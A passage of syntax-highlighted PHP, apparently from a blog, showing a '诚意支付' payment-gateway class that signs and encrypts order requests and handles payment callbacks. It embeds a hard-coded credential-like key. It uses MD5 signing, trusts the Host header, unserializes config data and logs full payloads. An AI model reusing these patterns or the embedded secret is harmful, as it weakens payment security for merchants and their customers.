class=\"keyword\">extends</span> <span class=\"title\">PayInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//请求接口Url</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $url      = <span class=\"string\">'https://pay.chenyipay.com/api/pay/v2'</span>;</span><br><span class=\"line\">    <span class=\"comment\">//接口名称</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $payName  = <span class=\"string\">'诚意支付'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//获取支付返回数据格式</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $retArr = [               <span class=\"comment\">//支付信息返回格式</span></span><br><span class=\"line\">            <span class=\"string\">'code'</span> =&gt; <span class=\"number\">1</span>,             <span class=\"comment\">//0:数据获取成功，其他数字，数据获取失败</span></span><br><span class=\"line\">            <span class=\"string\">'msg'</span> =&gt; <span class=\"string\">''</span>,             <span class=\"comment\">//返回的提示信息</span></span><br><span class=\"line\">            <span class=\"string\">'data'</span> =&gt; []             <span class=\"comment\">//返回数据</span></span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//回调处理返回数据格式</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $orderInfo = [            <span class=\"comment\">//异步验签结果返回格式</span></span><br><span class=\"line\">        <span class=\"string\">'code'</span> =&gt; <span class=\"number\">0</span>,                 <span class=\"comment\">//0：数据获取成功，其他数字，数据获取失败</span></span><br><span class=\"line\">        <span class=\"string\">'bank_num'</span> =&gt; <span class=\"number\">219050</span>,        <span class=\"comment\">//银行区分号（不同支付的前三位不同）</span></span><br><span class=\"line\">        <span class=\"string\">'order_no'</span> =&gt; <span class=\"string\">''</span>,            <span class=\"comment\">//后台数据库支付订单号</span></span><br><span class=\"line\">        <span class=\"string\">'amount'</span> =&gt; <span class=\"number\">0</span>,               <span class=\"comment\">//支付金额</span></span><br><span class=\"line\">        <span class=\"string\">'ret_error'</span> =&gt; <span class=\"number\">0</span>,            <span class=\"comment\">//回调处理失败时，返回接口字符串</span></span><br><span class=\"line\">        <span class=\"string\">'ret_success'</span> =&gt; <span class=\"string\">'ok'</span>,        <span class=\"comment\">//回调处理成功时，返回接口字符串</span></span><br><span class=\"line\">        <span class=\"string\">'bank_name'</span> =&gt; <span class=\"string\">'诚意支付'</span>,     <span class=\"comment\">//支付方式名称</span></span><br><span class=\"line\">        <span class=\"string\">'serial_no'</span> =&gt; <span class=\"string\">''</span>            <span class=\"comment\">//第三方回调返回的第三方支付订单号（支付流水号）</span></span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 构成函数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">parent</span>::__construct();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 调用第三方支付接口，获取支付信息</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $data 前端返回信息，payment_id，支付类型ID，config，支付类型配置信息</span></span><br><span class=\"line\"><span class=\"comment\">     * &#123;<span class=\"doctag\">@inheritDoc</span>&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@see</span> PayInfo::doPay()</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> $this-&gt;$retArr;</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doPay</span><span class=\"params\">($data)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//生成订单</span></span><br><span class=\"line\">        $orderInfo = <span class=\"keyword\">$this</span>-&gt;makeOrder($data);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$orderInfo) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219000</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付订单生成失败'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'订单生成失败，'</span> . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取配置支付信息</span></span><br><span class=\"line\">        $config      = unserialize($data[<span class=\"string\">'config'</span>]);</span><br><span class=\"line\">        $callbackurl = $config[<span class=\"string\">'callbackurl'</span>]?$config[<span class=\"string\">'callbackurl'</span>]:$_SERVER[<span class=\"string\">'HTTP_HOST'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($data[<span class=\"string\">'pay_type'</span>]) || <span class=\"keyword\">empty</span>($config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219001</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付银行类型不存在'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'银行类型不存在，'</span> . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $postData = [</span><br><span class=\"line\">            <span class=\"string\">'p1_mchtid'</span>   =&gt; $config[<span class=\"string\">'merchantID'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p2_paytype'</span>  =&gt; $config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'payStr'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p3_paymoney'</span> =&gt; $data[<span class=\"string\">'money'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p4_orderno'</span>  =&gt; $orderInfo,</span><br><span class=\"line\">            <span class=\"comment\">//异步</span></span><br><span class=\"line\">            <span class=\"string\">'p5_callbackurl'</span> =&gt; <span class=\"string\">\"http://\"</span>.$callbackurl.<span class=\"string\">\"/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=\"</span> . $data[<span class=\"string\">'payment_id'</span>],</span><br><span class=\"line\">            <span class=\"comment\">//同步</span></span><br><span class=\"line\">            <span class=\"string\">'p6_notifyurl'</span> =&gt; <span class=\"string\">\"http://\"</span>.$callbackurl.<span class=\"string\">\"/beeePayOk.php\"</span>,</span><br><span class=\"line\">            <span class=\"string\">'p7_version'</span>   =&gt; <span class=\"string\">'v2.9'</span>,</span><br><span class=\"line\">            <span class=\"string\">'p8_signtype'</span>  =&gt; <span class=\"string\">'2'</span>,</span><br><span class=\"line\">            <span class=\"string\">'p9_attach'</span>    =&gt; <span class=\"string\">'chengyi_'</span> . $data[<span class=\"string\">'payment_id'</span>],</span><br><span class=\"line\">            <span class=\"string\">'p10_appname'</span>  =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">            <span class=\"string\">'p11_isshow'</span>   =&gt; <span class=\"string\">'0'</span>,</span><br><span class=\"line\">            <span class=\"string\">'p12_orderip'</span>  =&gt; ip(),</span><br><span class=\"line\">            <span class=\"string\">'p13_memberid'</span> =&gt; $data[<span class=\"string\">'user_id'</span>],</span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">        payLog(<span class=\"string\">'chengyi.txt'</span>,print_r($postData,<span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//待签名字符串</span></span><br><span class=\"line\">        $signStr   = <span class=\"keyword\">$this</span>-&gt;get_sign($postData);</span><br><span class=\"line\">        <span class=\"comment\">//生成签名</span></span><br><span class=\"line\">        $postData[<span class=\"string\">\"sign\"</span>] = md5($signStr.$config[<span class=\"string\">'merchantKey'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//转为json字符串</span></span><br><span class=\"line\">        $jsonStr   = json_encode($postData);</span><br><span class=\"line\">        <span class=\"comment\">//获取公钥</span></span><br><span class=\"line\">        $publicKey = <span class=\"keyword\">$this</span>-&gt;publicKeyStr($config[<span class=\"string\">'merchantPublicKey'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//公钥加密</span></span><br><span class=\"line\">        $reqdata   = urlencode(<span class=\"keyword\">$this</span>-&gt;publicEncrypt($publicKey, $jsonStr));</span><br><span class=\"line\">        <span class=\"comment\">//请求参数</span></span><br><span class=\"line\">        $signData[<span class=\"string\">\"mchtid\"</span>]  = $config[<span class=\"string\">'merchantID'</span>];</span><br><span class=\"line\">        $signData[<span class=\"string\">\"reqdata\"</span>] = $reqdata;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//判断支付网关是否是wap</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'request_type'</span>] == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            $retData =  [</span><br><span class=\"line\">                <span class=\"string\">'type'</span>  =&gt; $config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'request_type'</span>],</span><br><span class=\"line\">                <span class=\"string\">'modes'</span> =&gt; $data[<span class=\"string\">'pay_model'</span>],</span><br><span class=\"line\">                <span class=\"string\">'html'</span>  =&gt; <span class=\"keyword\">$this</span>-&gt;paramToHtmlForm(<span class=\"keyword\">$this</span>-&gt;url, $signData)</span><br><span class=\"line\">            ];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'data'</span>]  = $retData;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//发起请求</span></span><br><span class=\"line\">        $result = <span class=\"keyword\">$this</span>-&gt;httpRequest(<span class=\"keyword\">$this</span>-&gt;url, json_encode($signData));</span><br><span class=\"line\">        <span class=\"comment\">//将json字符串转为数组</span></span><br><span class=\"line\">        $resultArr = json_decode($result,<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        <span class=\"comment\">//判断返回信息</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($resultArr[<span class=\"string\">'rspCode'</span>] != <span class=\"number\">1</span> &amp;&amp; !$resultArr[<span class=\"string\">'data'</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219002</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . $resultArr[<span class=\"string\">\"rspMsg\"</span>] . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $resultData = $resultArr[<span class=\"string\">'data'</span>];</span><br><span class=\"line\">        <span class=\"comment\">//验签</span></span><br><span class=\"line\">        $re = <span class=\"keyword\">$this</span>-&gt;payVerify($resultData, $config[<span class=\"string\">'merchantKey'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$re) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219003</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'验签失败'</span> . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        payLog(<span class=\"string\">'chengyi.txt'</span>,print_r($resultData, <span class=\"keyword\">true</span>). <span class=\"string\">\"===134\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        $retOderNo           = $orderInfo;</span><br><span class=\"line\">        $retOderPayNo        = <span class=\"keyword\">isset</span>($resultData[<span class=\"string\">'r2_systemorderno'</span>]) ? $resultData[<span class=\"string\">'r2_systemorderno'</span>] : <span class=\"string\">'chengyipay'</span> . date(<span class=\"string\">'YmdHis'</span>);</span><br><span class=\"line\">        $retOderPayQrcodrUrl = <span class=\"keyword\">isset</span>($resultData[<span class=\"string\">'r6_qrcode'</span>]) ? $resultData[<span class=\"string\">'r6_qrcode'</span>] : <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        $result = D(<span class=\"string\">'accountRecharge'</span>)-&gt;getOneCoupon(<span class=\"string\">'id'</span>, <span class=\"keyword\">array</span>(<span class=\"string\">'order_sn'</span> =&gt; $retOderNo, <span class=\"string\">'status'</span> =&gt; <span class=\"number\">0</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($result)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219004</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'返回数据成功,但订单表没有查到相应未完成的订单号，'</span> . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        D(<span class=\"string\">'accountRecharge'</span>)-&gt;save([<span class=\"string\">'remark'</span> =&gt; $retOderPayNo], [<span class=\"string\">'order_sn'</span> =&gt; $retOderNo]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 用于安全验证返回url是否非法</span></span><br><span class=\"line\">        $shortQrcodrUrl =<span class=\"keyword\">$this</span>-&gt;shortUrl($retOderPayQrcodrUrl, <span class=\"string\">'5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$shortQrcodrUrl) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219005</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'二维码获取成功，但转换短链接失败'</span> . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        session::set(<span class=\"string\">'qrcode_url'</span>, $shortQrcodrUrl);</span><br><span class=\"line\">        session::set(<span class=\"string\">'pay_url'</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//type =1 返回二维码数据</span></span><br><span class=\"line\">        $ret =  [</span><br><span class=\"line\">            <span class=\"string\">'type'</span>     =&gt; $config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'request_type'</span>],</span><br><span class=\"line\">            <span class=\"string\">'code_url'</span> =&gt; $shortQrcodrUrl,</span><br><span class=\"line\">            <span class=\"string\">'pay_url'</span>  =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">            <span class=\"string\">'order_no'</span> =&gt; $orderInfo,</span><br><span class=\"line\">            <span class=\"string\">'modes'</span>    =&gt; $data[<span class=\"string\">'pay_model'</span>]</span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'data'</span>] = $ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 支付回调处理</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $postData data：回调返回的数据，payment_Id：支付类型ID</span></span><br><span class=\"line\"><span class=\"comment\">     * &#123;<span class=\"doctag\">@inheritDoc</span>&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@see</span> PayInfo::doPaycallBack()</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> array $this-&gt;$retArr;</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doPaycallBack</span><span class=\"params\">($postData)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//接收回调后 返回 ok;</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'ok'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//处理post回调数据</span></span><br><span class=\"line\">        $data       = json_decode($postData[<span class=\"string\">'data'</span>], <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        $reqdata    = $data[<span class=\"string\">'reqdata'</span>];</span><br><span class=\"line\">        $config     = unserialize($postData[<span class=\"string\">'config'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        payLog(<span class=\"string\">'chengyi.txt'</span>,print_r($postData, <span class=\"keyword\">true</span>).<span class=\"string\">'----996--'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//判断字符串是否需要 urldecode解</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos($reqdata, <span class=\"string\">'%'</span>)) &#123;</span><br><span class=\"line\">            $reqdata =  urldecode($reqdata);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array($config)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219020</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知,获取数据库配置错误！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$reqdata) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219021</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知:获取重要参数错误！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取私钥</span></span><br><span class=\"line\">        $private_key = <span class=\"keyword\">$this</span>-&gt;privateKeyStr($config[<span class=\"string\">'merchantPrivateKey'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//解密</span></span><br><span class=\"line\">        $dataJson    = <span class=\"keyword\">$this</span>-&gt;privateDecrypt($reqdata, $private_key);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$dataJson) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219022</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知：支付解密失败！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $arr = json_decode($dataJson, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        $arr[<span class=\"string\">'partner'</span>] = $config[<span class=\"string\">'merchantID'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//去除不需要参入验签的字段</span></span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($arr[<span class=\"string\">\"sysnumber\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($arr[<span class=\"string\">\"attach\"</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//验证签名</span></span><br><span class=\"line\">        $re = <span class=\"keyword\">$this</span>-&gt;payVerify($arr, $config[<span class=\"string\">'merchantKey'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$re) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219023</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知：验签失败！'</span>  . print_r($arr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($arr[<span class=\"string\">'orderstatus'</span>]) || $arr[<span class=\"string\">'orderstatus'</span>] != <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219024</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知：支付失败！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>]  = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'order_no'</span>]  = $data[<span class=\"string\">'ordernumber'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'amount'</span>]    = $data[<span class=\"string\">'paymoney'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'serial_no'</span>] = $data[<span class=\"string\">'sysnumber'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [get_sign 拼接签名字符串]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $arr 数组</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]      [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_sign</span><span class=\"params\">($arr)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">\t\t$signmd5=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">foreach</span>($arr <span class=\"keyword\">as</span> $x=&gt;$x_value)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($signmd5==<span class=\"string\">\"\"</span>)&#123;</span><br><span class=\"line\">\t\t\t\t$signmd5 =$signmd5.$x .<span class=\"string\">'='</span>. $x_value;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t$signmd5 = $signmd5.<span class=\"string\">'&amp;'</span>.$x .<span class=\"string\">'='</span>. $x_value;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $signmd5;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [publicKeyStr 公钥字符串处理]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $publicStr 公钥字符串</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]            [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">publicKeyStr</span><span class=\"params\">($publicStr)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $public_key = <span class=\"string\">\"-----BEGIN PUBLIC KEY-----\\r\\n\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (str_split($publicStr,<span class=\"number\">64</span>) <span class=\"keyword\">as</span> $str)&#123;</span><br><span class=\"line\">            $public_key .= $str . <span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        